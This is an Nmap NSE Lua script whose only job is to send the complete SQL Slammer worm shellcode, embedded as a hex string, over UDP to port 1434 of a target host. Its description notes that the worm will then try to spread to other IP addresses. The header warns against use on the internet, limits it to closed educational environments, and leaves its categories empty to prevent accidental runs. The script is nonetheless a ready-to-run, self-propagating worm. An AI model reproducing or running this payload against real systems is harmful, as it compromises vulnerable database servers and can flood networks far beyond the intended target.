local nmap = require "nmap"                                     
local shortport = require "shortport"                           
local bin = require "bin"

description = [[Sends the SQL Slammer worm to a host.           
If vulnerable, it will attempt to propagate to other IP addresses.
DO NOT RUN THIS SCRIPT ON THE INTERNET. For use in closed environments
for educational purpose only.]]

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
author = "Daniel Miller"                                        

categories = {} -- No categories so we don't accidentally run

portrule = shortport.port_or_service(1434, "ms-sql-m", "udp")   

action = function(host, port)                                   
  local slammer = "04010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101dcc9b042eb0e0101010101010170ae420170ae42909090909090909068dcc9b042b80101010131c9b11850e2fd35010101055089e551682e646c6c68656c3332686b65726e51686f756e746869636b43684765745466b96c6c516833322e64687773325f66b965745168736f636b66b9746f516873656e64be1810ae428d45d450ff16508d45e0508d45f050ff1650be1010ae428b1e8b033d558bec517405be1c10ae42ff16ffd031c951515081f10301049b81f101010101518d45cc508b45c050ff166a116a026a02ffd0508d45c4508b45c050ff1689c609db81f33c61d9ff8b45b48d0c408d1488c1e20401c2c1e20829c28d049001d88945b46a108d45b05031c9516681f17801518d4503508b45ac50ffd6ebca"
  local s = nmap.new_socket("udp")                              
  local status, err = s:sendto(host, port, bin.pack("H", slammer))
  if status then
    return "SQL Slammer Worm sent"                              
  else
    return err                                                  
  end                                                           
end
